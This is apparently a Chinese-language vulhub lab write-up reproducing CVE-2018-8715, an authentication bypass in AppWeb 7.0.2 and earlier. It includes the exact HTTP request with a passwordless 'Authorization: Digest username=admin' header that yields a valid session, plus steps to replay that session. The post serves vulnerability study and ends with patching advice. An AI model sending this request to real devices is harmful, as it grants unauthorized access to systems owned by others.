---
title: AppWeb 漏洞复现
author: jh2ng
cover: 'http://image.jh2ing.com/image-20220626202035980.png'
tags:
  - vulhub
categories:
  - 漏洞复现
abbrlink: 57611
date: 2022-06-26 20:18:00
---

### AppWeb认证绕过漏洞（CVE-2018-8715）

#### 漏洞描述

AppWeb是Embedthis Software LLC公司负责开发维护的一个基于GPL开源协议的嵌入式Web Server。他使用C/C++来编写，能够运行在几乎先进所有流行的操作系统上。当然他最主要的应用场景还是为嵌入式设备提供Web Application容器。

AppWeb可以进行认证配置，其认证方式包括以下三种：

- basic 传统HTTP基础认证
- digest 改进版HTTP基础认证，认证成功后将使用Cookie来保存状态，而不用再传递Authorization头
- form 表单认证

#### 影响版本

Appweb 7.0.2及早期版本

#### 环境搭建

![image-20220626194038634](http://image.jh2ing.com/image-20220626194038634.png)

访问 http://your-ip:8080，需要输入账号密码。

![image-20220626194244114](http://image.jh2ing.com/image-20220626194244114.png)

#### 漏洞复现

利用该漏洞需要知道一个已存在的用户名，当前环境下用户名为`admin`。

构造头`Authorization: Digest username=admin`，并发送如下数据包：

```
GET / HTTP/1.1
Host: example.com
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Authorization: Digest username=admin
```

因为我们没有传入密码字段，所以服务端出现错误，直接返回了200，且包含一个session：

设置这个session到浏览器，即可正常访问需要认证的页面：

![image-20220626201043100](http://image.jh2ing.com/image-20220626201043100.png)

或者直接在登录界面输入账号，然后抓取数据包

![image-20220626201800103](http://image.jh2ing.com/image-20220626201800103.png)

**Authorization**仅保留`Digest username=admin`

![image-20220626201943185](http://image.jh2ing.com/image-20220626201943185.png)

然后forward：

![image-20220626202035980](http://image.jh2ing.com/image-20220626202035980.png)

#### 修复建议

打补丁或者直接升级到最新版
